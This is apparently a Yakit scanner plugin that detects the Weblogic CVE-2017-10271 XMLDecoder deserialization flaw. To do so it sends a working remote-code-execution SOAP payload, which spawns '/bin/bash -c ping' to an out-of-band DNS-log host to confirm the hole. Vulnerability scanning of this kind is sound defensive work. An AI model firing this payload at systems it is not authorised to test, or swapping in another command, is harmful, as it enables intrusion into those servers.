# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    server,token,err = risk.NewDNSLogDomain()

    packet = `POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>ping -c 2 {{params(server)}}</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"server":server,}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        time.sleep(2)
        dnsRes = risk.CheckDNSLogByToken(token)
        reg = str.f(`Token:"%s"`,token)
        // println(server,dnsRes,"lllllllllllllll",reg)
        if str.MatchAllOfSubString(dnsRes,reg){
            yakit.Info("%v found Weblogic CVE-2017-10271 XMLDecoder Deserialization Vulnerability ", addr)
            risk.NewRisk(
            addr,risk.title("CVE-2017-10271"),
            risk.severity("high"),
            risk.titleVerbose("Weblogic CVE-2017-10271 XMLDecoder 反序列化漏洞"),
            risk.type("rce[Weblogic]"),
            risk.payload(str.f(`ping -c 4 %s`,server)),
            risk.details({
                "target":addr,
                "request":req,
                "response":rsp,
            }),
        )
        }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    // println(result.Fingerprint.CPEs)
    if len(result.Fingerprint.HttpFlows)>0{
        if str.MatchAllOfSubString(result.Fingerprint.CPEs, "weblogic_server"){
            handleCheck(result.Target,result.Port)
        }
        
    }
    
}
